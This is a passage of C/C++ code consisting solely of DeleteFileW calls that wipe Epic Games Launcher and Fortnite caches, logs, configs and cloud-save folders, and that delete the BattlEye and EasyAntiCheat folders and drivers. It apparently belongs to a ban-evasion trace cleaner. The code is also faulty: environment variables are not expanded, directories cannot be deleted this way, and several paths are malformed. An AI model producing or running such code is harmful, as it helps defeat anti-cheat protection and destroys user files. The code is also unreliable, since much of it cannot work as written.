	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002c");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002d");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002e");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002f");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000030");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000031");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000032");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000033");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000034");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000035");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000036");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000037");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000038");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000039");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003a");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003b");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003c");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003d");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003e");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003f");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000040");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000041");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000042");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000043");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000044");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000045");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000046");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\09_SubgameSelect_Default_StW-512x1024-e47f51e25cbe9943678b9221056a808e81da40e3.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_BattleLabs_PlaylistTile-(2)-1024x512-ca5f4e84a2941264f787239caa5458d0eabd39e3.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_In-Game_Launch_Week1_SubgameSelect-512x1024-8b298ddfb13ca218af3f10017e4e989888212e9e.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Duos-1024x512-b73da22f5ef25695bd78814e0c708253a2cfd66b.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Solo-1024x512-867508f824d65b998c1e11180306eeb720b1aa11.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Squad-1024x512-4bca2b25311bd5b8c6bd4a4aa32b2bfa2fadbf78.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_LTM_Siphon_PlaylistTile-1024x512-712b3caea93ea8df09d1592c88d55913ad296526.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_LunarNewYear_GanPickaxe_MOTD_1920x1080-1920x1080-7c458359ec91e63c981ae8bae9498a590446c32b.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\BR06_ModeTile_TDM-1024x512-878ba9f92deb153ec85f2bcbce925e185344290e.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\C2CM_Launch_In-Game_Subgame_PropHunt-512x1024-c84b714dc3c2f4ec9dc966074c0c53deef2dc9.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\CM_LobbyTileArt-1024x512-fb48db36552ccb1ab4021b722ea29d515377cc.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Fbattleroyalenews%2F1140+HF%2F8ball_MOTD_1024x512-1024x512-b8690a2ee91e5ccfc2c9ab23561be0dda6ee55.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Ftournaments%2F11BR_Arena_ModeTiles_Duos-1024x512-a431d8587eb87ad5630eada21b60bca9874d116a.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Ftournaments%2F11BR_Arena_ModeTiles_Solo_ModeTile-1024x512-6cee09d7bcf82ce3f32ca7c77ca04948121ce617.jpg");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\DMS");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c7dee411e20a44ab930f841e8d206b1b");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b6c60402a72e4081a6a47c641371c19f");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\a22d837b6a2b46349421259c0a5411bf");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\3460cbe1c57d4a838ace32951a4d7171");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\7e2a66ce68554814b1bd0aa14351cd71");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c52c1f9246eb48ce9dade87be5a66f29");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b800b911053c4906a5bd399f46ae0055");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\47343f26116f49d1a460ad740dc2bbbb\\ClientSettings.Sav");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Input.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Lightmass.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\PortalRegions.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-3F785CCB48B0E4F697FA2DA1403F027A\\CrashReportClient.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-D36903E04AEBB495D1D6A58F05AC6671\\CrashReportClient.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-F219A7F84FE8B0694E2FACB917EF2D34\\CrashReportClient.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\47d12477ed4c40cab8623c53ea967927.dat");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher-backup-2020.01.28-07.02.36.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher-backup-2020.01.28-09.00.40.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher-backup-2020.01.28-09.00.50.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher_2.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\SelfUpdatePrereqInstall.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\SelfUpdatePrereqInstall_0_PortalPrereqSetup.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOG.old");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_www.epicgames.com_0.localstorage-journal");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\6dfe4cbf-2643-41f6-977a-7f1e6f36a2f2\\index-dir\\the-real-index");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOG.old");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\HardwareSurvey\\dxdiag.txt");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Compat.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\EditorPerProjectUserSettings.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Engine.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Game.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\GameUserSettings.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Hardware.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Input.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Lightmass.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\MessagingDebugger.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\PortalRegions.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Scalability.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\UdpMessaging.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\XCodeSourceCodeAccess.ini");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\Common Files\\BattlEye");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\Common Files\\BattlEye\\BEDaisy.sys");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\CommonFiles\\BattlEye\\BEDaisy.sys\\");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\EasyAntiCheat");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.sys");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\Epic Games\\Launcher\\Engine\\Programs\\CrashReportClient\\Config\\DefaultEngine.ini");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\Epic Games\\Launcher\\VaultCache");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\EpicGames\\Launcher\\Portal\\Binaries\\Win32");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\EpicGames\\Launcher\\Portal\\Binaries\\Win32\\");
	DeleteFileW(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Base.ini");
	DeleteFileW(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseGame.ini");
	DeleteFileW(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseInput.ini");
	DeleteFileW(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\BaseWindowsLightmass.ini");
	DeleteFileW(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\WindowsGame.ini");
	DeleteFileW(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Portal\\Config\\UserLightmass.ini");
	DeleteFileW(L"%systemdrive%\\Program Files(x86)Epic Games\\Launcher\\Engine\\Config\\BaseHardware.ini");
	DeleteFileW(L"%systemdrive%\\Program Files(x86)Epic Games\\Launcher\\Portal\\Config\\NotForLicensees\\Windows\\WindowsHardware.ini");
	DeleteFileW(L"%systemdrive%\\Program Files(x86)Epic Games\\Launcher\\Portal\\Config\\UserScalability.ini");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite1\\FortniteGame\\PersistentDownloadDir\\CMS");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite1\\FortniteGame\\PersistentDownloadDir\\EMS");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Config\\NoRedist\\Windows\\ShippableWindowsGameUserSettings.ini");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\CurveEditorTools\\AssetRegistry.bin");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\SharedFiles:VersionCache");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\XSettings.Sav");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca\\");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca\\index");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca\\index-dir");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca\\index-dir\\the-real-index");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\e6a49143-8892-41ce-8a92-f2ec698a4ab8");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\e6a49143-8892-41ce-8a92-f2ec698a4ab8\\index-dir");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\e6a49143-8892-41ce-8a92-f2ec698a4ab8\\index-dir\\the-real-index");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56\\");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56\\index");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56\\index-dir");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56\\index-dir\\the-real-index");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\index.txt");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\000003.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\CURRENT");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOCK");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\5dbdef24-37ef-4a7a-ba75-ee9bc4a22645");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\5dbdef24-37ef-4a7a-ba75-ee9bc4a22645\\index-dir");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\b90b1134-2a94-4983-be85-2c213daffc4d");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\b90b1134-2a94-4983-be85-2c213daffc4d\\index-dir");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\dacadf8b-e278-424e-8f13-649b4a298a56");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\dacadf8b-e278-424e-8f13-649b4a298a56\\index-dir");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\index-dir");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\HiddenWebhelperCache\\Service Worker\\ScriptCache\\index-dir");
	DeleteFileW(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS");
	DeleteFileW(L"%systemdrive%\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\stage");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Cloud");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\d945f059b8b54aa58202ed2989bebfc8");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\CrashReportClient");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-AED3596C4ADFAC4DB9E422A6546810D3");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\WindowsClient");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Demos");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\LMS");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Logs");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
	DeleteFileW(L"%systemdrive%\\Users\\%Username%\\AppData\\Local\\BattlEye");
	DeleteFileW(L"%systemdrive%\\Program Files (x86)\\Epic Games\\Launcher\\Portal\\Content\\New UI\\White.png");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\index");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_2");
